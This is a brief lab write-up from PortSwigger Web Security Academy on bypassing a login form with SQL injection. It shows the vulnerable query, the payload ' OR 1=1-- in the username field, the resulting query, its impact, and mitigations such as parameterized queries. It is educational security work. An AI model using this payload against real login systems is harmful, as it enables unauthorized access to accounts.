# SQL Injection – Authentication Bypass

## Lab
PortSwigger Web Security Academy

## Objective
Bypass the login form using SQL injection.

---

## Vulnerability

The login form does not properly sanitize user input before using it in an SQL query.

Example query used by the application:

```
SELECT * FROM users WHERE username = 'input' AND password = 'input'
```

---

## Exploitation

Injected the following payload in the username field:

```
' OR 1=1--
```

Password field:

```
anything
```

Resulting SQL query:

```
SELECT * FROM users WHERE username='' OR 1=1--' AND password='anything'
```

Since `1=1` is always true, authentication is bypassed.

---

## Impact

An attacker can log in without valid credentials and gain unauthorized access.

---

## Mitigation

- Use parameterized queries
- Implement prepared statements
- Validate user input
